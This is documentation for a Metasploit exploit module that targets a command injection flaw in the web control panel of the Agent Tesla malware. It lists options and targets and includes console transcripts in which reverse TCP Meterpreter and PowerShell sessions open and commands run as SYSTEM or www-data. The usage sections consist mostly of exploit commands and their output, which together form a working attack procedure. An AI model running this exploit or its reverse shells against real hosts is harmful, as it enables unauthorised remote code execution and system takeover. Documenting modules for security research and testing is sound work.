## Introduction

This module exploit the command injection vulnerability in control center of the agent Tesla.

## Setup

Resources for testing are available here:
<https://github.com/mekhalleh/agent_tesla_panel_rce/resources/>

### Windows

I used WAMP server 3.1.9 x64 configured with PHP version 5.6.40 (for ioncube compatibility).

### Linux

I used a Debian 9 on which I installed PHP version 5.6.40 (for ioncube compatibility).

## Verification Steps

1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/multi/http/agent_tesla_panel_rce`
4. Do: `set RHOSTS 192.168.0.15`
5. Do: `run`

## Targets

```
   Id  Name
   --  ----
   0   Automatic (Dropper)
   1   Unix (In-Memory)
   2   Windows (In-Memory)
```

## Options

**Proxies**

A proxy chain of format type:host:port[,type:host:port][...]. It's optional.

**RHOSTS**

The target IP adress on which the control center responds.

**RPORT**

The target TCP port on which the control center responds. Default: 80

**SSL**

Negotiate SSL/TLS for outgoing connections. Default: false

**TARGETURI**

The base URI path of control center. Default: '/WebPanel

**VHOST**

The target HTTP server virtual host.

## Usage

### Targeting Windows

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set rhosts 192.168.1.21
rhosts => 192.168.1.21
msf5 exploit(multi/http/agent_tesla_panel_rce) > set lhost 192.168.1.13
lhost => 192.168.1.13
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Targeted operating system is: windows
[*] Sending php/meterpreter/reverse_tcp command payload
[*] Payload uploaded as: .AUKU.php
[*] Sending stage (38247 bytes) to 192.168.1.21
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.21:1036) at 2019-09-04 01:24:12 +0400

meterpreter >
```

--or--

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 2
target => 2
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Sending cmd/windows/reverse_powershell command payload
[*] Command shell session 2 opened (192.168.1.13:4444 -> 192.168.1.21:1040) at 2019-09-04 01:28:55 +0400

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\wamp64\www\WebPanel\server_side\scripts>whoami
nt authority\system

C:\wamp64\www\WebPanel\server_side\scripts>
```

--or--

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 2
target => 2
msf5 exploit(multi/http/agent_tesla_panel_rce) > set payload cmd/windows/generic
payload => cmd/windows/generic
msf5 exploit(multi/http/agent_tesla_panel_rce) > set cmd whoami
cmd => whoami
msf5 exploit(multi/http/agent_tesla_panel_rce) > set verbose true
verbose => true
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[+] The target appears to be vulnerable.
[*] Sending cmd/windows/generic command payload
[*] Generated command payload: whoami
[!] Dumping command output in parsed json response
nt authority\system
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/agent_tesla_panel_rce) >
```

### Targeting Linux

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Targeted operating system is: linux
[*] Sending php/meterpreter/reverse_tcp command payload
[*] Payload uploaded as: .WxWf.php
[*] Sending stage (38247 bytes) to 192.168.1.25
[*] Meterpreter session 2 opened (192.168.1.13:4444 -> 192.168.1.25:43260) at 2019-09-04 14:44:07 +0400

meterpreter >
```

--or--

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 1
target => 1
msf5 exploit(multi/http/agent_tesla_panel_rce) > set cmd whoami
cmd => whoami
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Sending cmd/unix/generic command payload
[!] Dumping command output in parsed json response
www-data
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/agent_tesla_panel_rce) >
```

## References

  1. <https://www.cyber.nj.gov/threat-profiles/trojan-variants/agent-tesla>
  2. <https://krebsonsecurity.com/2018/10/who-is-agent-tesla/>
  3. <https://github.com/mekhalleh/agent_tesla_panel_rce/resources/>
  4. <https://www.exploit-db.com/exploits/47256>
